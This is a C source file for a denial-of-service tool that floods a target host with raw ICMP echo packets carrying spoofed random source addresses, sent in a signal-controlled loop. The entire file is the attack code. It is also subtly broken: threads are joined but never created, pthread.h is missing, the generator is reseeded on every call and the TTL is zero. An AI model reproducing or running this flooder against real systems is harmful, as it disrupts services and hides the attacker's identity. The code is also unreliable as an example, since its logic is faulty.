#include<stdio.h>
#include<ctype.h>
#include<unistd.h>
#include<fcntl.h>
#include<signal.h>
#include<sys/time.h>
#include<sys/types.h>
#include<sys/socket.h>
#include<netdb.h>
#include<error.h>
#include<stdlib.h>
#include<time.h>
#include<netinet/ip.h>
#include<netinet/ip_icmp.h>
#include<string.h>
#include<netinet/in.h>

#define MAXCHILD 128
static unsigned long dest=0;
static int PROTO_ICMP=-1;
static alive=-1;
int rawsock;

static inline long myrandom(int begin,int end)
{
	int gap=end-begin +1;
	int ret=0;
	
	srand((unsigned)time(0));
	ret=random()%gap + begin;
	return ret;
	
}

static void Dos_icmp(void)
{
	struct sockaddr_in to;
	struct ip *iph;
	struct icmp *icmph;
	char *packet;
	int pktsize=sizeof(struct ip)+sizeof(struct icmp)+64;
	packet=malloc(pktsize);
	iph=(struct ip*)packet;
	icmph=(struct icmp*)(packet+sizeof(struct ip));
	memset(packet,0,pktsize);
 
	//ip的头部封装
	iph->ip_v=4;
	iph->ip_hl=5;
	iph->ip_tos=0;
	iph->ip_len=htons(pktsize);
	iph->ip_id=htons(getpid());
	iph->ip_off=0;
	iph->ip_ttl=0x0;
	iph->ip_src.s_addr=(unsigned long int)myrandom(0,65535);
	iph->ip_dst.s_addr=dest;

    //icmp requset
	icmph->icmp_type=ICMP_ECHO;
	icmph->icmp_code=0;
	/* 由于数据部分为0,并且代码为0,直接对不为0即icmp_type部分计算 */
	icmph->icmp_cksum=htons(~(ICMP_ECHO<<8));  
	
	to.sin_family=AF_INET;
	to.sin_addr=iph->ip_dst;
	to.sin_port=htons(0);
	
	sendto(rawsock,packet,pktsize,0,(struct sockaddr *)&to,
		   sizeof(struct sockaddr));
	free(packet);
	
}

static void Dos_fun(unsigned long ip)
{
	while(alive)
	{
		Dos_icmp();
	}
}

static void Dos_sig(int signo)
{
	alive=0;
}

int main(int argc,char *argv[])
{
	struct hostent *host=NULL;
	struct protoent *protocol=NULL;
	char protoname[]="icmp";
	int i =0;
	pthread_t pthread[MAXCHILD ];
	int err=-1;
	
	alive=1;
	signal(SIGINT,Dos_sig);
	if(argc<2){
		return -1;
	}
	
	protocol=getprotobyname(protoname);
	if(protocol == NULL){
		perror("getprotobyname()");
		return -1;
	}

	PROTO_ICMP=protocol->p_proto;
	dest=inet_addr(argv[1]);
	if(dest==INADDR_NONE){
		host=gethostbyname(argv[1]);
		if(host==NULL){
			perror("gethostbyname");
			return -1;
		}

		memcpy((char *)&dest,host->h_addr,host->h_length);
		
	}

	// built original socket
	rawsock=socket(AF_INET,SOCK_RAW,IPPROTO_RAW);
	if(rawsock<0)
		rawsock=socket(AF_INET,SOCK_RAW,PROTO_ICMP);
	
	//set option of ip packet
	setsockopt(rawsock,SOL_IP,IP_HDRINCL,"1",sizeof("1"));

	//work on many pthreads
	for(i=0;i<MAXCHILD;i++)
	{
		pthread_join(pthread[i],NULL);
	}

	close(rawsock);
	return 0;
}














































































